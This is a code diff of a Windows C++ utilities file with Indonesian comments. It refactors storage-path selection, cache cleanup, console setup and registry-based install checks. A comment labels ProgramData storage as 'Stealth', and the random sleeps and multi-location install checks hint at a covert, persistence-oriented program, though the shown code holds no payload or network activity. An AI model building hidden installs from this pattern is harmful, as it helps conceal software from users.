@@ -9,7 +9,7 @@
 #include <thread>
 #include <shlobj.h>
 #include <algorithm>
-#include <filesystem> // Wajib untuk std::filesystem
+#include <filesystem>
 #include <vector>
 #include <tlhelp32.h>
 
@@ -17,7 +17,6 @@ namespace fs = std::filesystem;
 
 std::string Ws2S(const std::wstring& wstr) {
     if (wstr.empty()) return "";
-    // Menghitung ukuran yang dibutuhkan
     int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
     if (size <= 0) return "";
     
@@ -30,16 +29,15 @@ fs::path GetStoragePath() {
     wchar_t path[MAX_PATH];
     std::error_code ec;
 
-    // Prioritas 1: Cek ProgramData (C:\ProgramData) - Stealth & Global
+    // Prioritas 1: ProgramData (Global & Stealth)
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) {
         fs::path p = fs::path(path) / Config::DATA_DIR;
-        // Hanya kembalikan jika kita punya izin menulis atau folder sudah ada
         if (fs::exists(p) || fs::create_directories(p, ec)) {
             return p;
         }
     }
 
-    // Prioritas 2: Local AppData (User Level) - Jika tidak punya akses admin
+    // Prioritas 2: Local AppData (User Level)
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
         fs::path p = fs::path(path) / Config::DATA_DIR;
         if (fs::exists(p) || fs::create_directories(p, ec)) {
@@ -47,9 +45,9 @@ fs::path GetStoragePath() {
         }
     }
     
-    // Prioritas 3: Fallback terakhir ke folder Temp
+    // Prioritas 3: Temp Folder
     fs::path tempP = fs::temp_directory_path() / Config::DATA_DIR;
-    fs::create_directories(tempP, ec);
+    if (!fs::exists(tempP)) fs::create_directories(tempP, ec);
     return tempP;
 }
 
@@ -68,22 +66,22 @@ void RandomSleep(int minSec, int maxSec) {
 }
 
 void ShowConsole() {
-    AllocConsole();
-    freopen("CONIN$", "r", stdin);
-    freopen("CONOUT$", "w", stdout);
-    freopen("CONOUT$", "w", stderr);
-    
-    std::wcin.clear();
-    std::wcout.clear();
+    if (AllocConsole()) {
+        FILE* fDummy;
+        freopen_s(&fDummy, "CONIN$", "r", stdin);
+        freopen_s(&fDummy, "CONOUT$", "w", stdout);
+        freopen_s(&fDummy, "CONOUT$", "w", stderr);
+        std::wcin.clear();
+        std::wcout.clear();
+    }
 }
 
 void CleanupOldData() {
     try {
         auto now = std::chrono::system_clock::now();
-        
-        // Daftar semua kemungkinan lokasi penyimpanan untuk dibersihkan
         std::vector<fs::path> searchPaths;
         wchar_t path[MAX_PATH];
+
         if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) 
             searchPaths.push_back(fs::path(path) / Config::DATA_DIR / "Cache");
         if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) 
@@ -91,47 +89,61 @@ void CleanupOldData() {
         searchPaths.push_back(fs::temp_directory_path() / Config::DATA_DIR / "Cache");
 
         for (auto& root : searchPaths) {
+            std::error_code ec;
             if (!fs::exists(root)) continue;
 
-            for (auto& dir : fs::recursive_directory_iterator(root)) {
-                if (fs::is_regular_file(dir)) {
-                    auto ftime = fs::last_write_time(dir);
-                    // Konversi file_time ke system_clock untuk perbandingan
-                    auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(ftime - fs::file_time_type::clock::now() + now);
+            // Gunakan directory_iterator dengan error_code agar tidak crash saat akses ditolak
+            for (auto const& dir_entry : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied, ec)) {
+                if (ec) break;
+                
+                if (fs::is_regular_file(dir_entry, ec)) {
+                    auto ftime = fs::last_write_time(dir_entry, ec);
+                    if (ec) continue;
+
+                    // Konversi yang lebih aman untuk menghitung umur file (dalam jam)
+                    auto sctp = std::chrono::time_point_cast<std::chrono::system_clock::duration>(
+                                ftime - fs::file_time_type::clock::now() + std::chrono::system_clock::now());
+                    
                     auto age = std::chrono::duration_cast<std::chrono::hours>(now - sctp).count();
-                    // Hapus jika lebih dari 14 hari (336 jam)
-                    if (age > 336) fs::remove(dir);
+                    
+                    // Hapus jika lebih dari 14 hari
+                    if (age > 336) {
+                        fs::remove(dir_entry, ec);
+                    }
                 }
             }
         }
     } catch (...) {}
 }
 
-// core/utils.cpp
-
 bool IsAlreadyInstalled() {
     HKEY hKey;
-    // Cek apakah Registry sudah ada
+    bool foundInRegistry = false;
+
+    // Cek di HKCU
     if (RegOpenKeyExW(HKEY_CURRENT_USER, Config::REG_PATH.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        foundInRegistry = true;
         RegCloseKey(hKey);
-        
-        // Periksa semua lokasi fallback yang mungkin digunakan oleh fungsi Install()
+    } 
+    // Cek juga di HKLM jika HKCU tidak ada (untuk instalasi admin-level)
+    else if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, Config::REG_PATH.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        foundInRegistry = true;
+        RegCloseKey(hKey);
+    }
+
+    if (foundInRegistry) {
         std::vector<fs::path> checkPaths;
         wchar_t path[MAX_PATH];
         
         if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path))) 
             checkPaths.push_back(fs::path(path) / Config::DATA_DIR / Config::EXE_NAME);
-            
         if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) 
             checkPaths.push_back(fs::path(path) / Config::DATA_DIR / Config::EXE_NAME);
-            
         checkPaths.push_back(fs::temp_directory_path() / Config::DATA_DIR / Config::EXE_NAME);
 
-        // Jika salah satu file ditemukan, berarti sudah terinstall
         for (const auto& targetExe : checkPaths) {
-            if (fs::exists(targetExe)) {
-                return true;
-            }
+            std::error_code ec;
+            if (fs::exists(targetExe, ec)) return true;
         }
     }
     return false;
